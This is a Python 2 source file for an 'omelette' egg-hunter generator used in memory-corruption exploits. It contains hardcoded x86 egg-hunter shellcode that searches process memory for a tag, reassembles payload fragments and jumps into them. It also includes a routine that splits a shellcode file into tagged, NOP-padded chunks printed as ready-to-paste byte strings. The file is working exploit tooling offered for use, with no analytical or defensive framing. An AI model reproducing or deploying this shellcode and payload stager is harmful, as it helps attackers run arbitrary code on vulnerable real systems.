import sys


class Omlete(object):

    def __init__(
            self,
            chunk_size=None,
            padding=None,
            tag=None,
            shellcode=None,
            var_name=None):
        self.shellcode = shellcode
        self.chunk_size = chunk_size
        self.padding = ["\\x90"] * padding
        self.tag = tag
        self.var_name = var_name
        print "[+] generate with tag \\x12\\x34\\x56\\x78 0x78563412\n"

    def split(self, arr, size):
        arrs = []
        while len(arr) > size:
            pice = arr[:size]
            arrs.append(pice)
            arr = arr[size:]
        arrs.append(arr)
        return arrs

    def small_omlete(self):
        omlete_hunter = ("\\x89\\xe5\\x66\\x81\\xcb\\xff\\x0f\\x43\\x31\\xc0\\xb0\\x02\\x89\\xda\\xcd\\x2e"
            "\\x3c\\x05\\x74\\xee\\xb8\\x12\\x34\\x56\\x78\\x89\\xdf\\xaf\\x75\\xe9\\x89\\xfe\\x89\\xef\\x66"
            "\\xad\\x31\\xc9\\x88\\xe1\\x3c\\x01\\xf3\\xa4\\x89\\xfd\\x75\\xd7\\xff\\xe4")
        return "omlete_hunter=\"" + omlete_hunter + "\""

    def generate(self):
        count = 0
        try:
            data = open(self.shellcode).read()
        except:
            print "Error Reading File"
            sys.exit(0)
        arrs = self.split(data, self.chunk_size)
        if not self.var_name:
            self.var_name = 'OMLETE'
        omlete_shell = self.small_omlete()
        print omlete_shell
        print "\n"
        for i, arr in enumerate(arrs):
            count += 1
            shell = []
            shell += self.padding
            shell += self.tag
            if i != len(arrs) - 1:
                shell.append("\\x02")
            else:
                shell.append("\\x01")
            shell.append("\\x" + str(hex(len(arr))).replace("0x", ""))
            shell += [
                "\\x" + arr.encode("hex")[i * 2:i * 2 + 2]
                for i in range(len(arr.encode('hex')) / 2)
            ]
            egg = self.var_name + str(count) + "=\""
            egg += "".join(shell)
            print egg + "\""
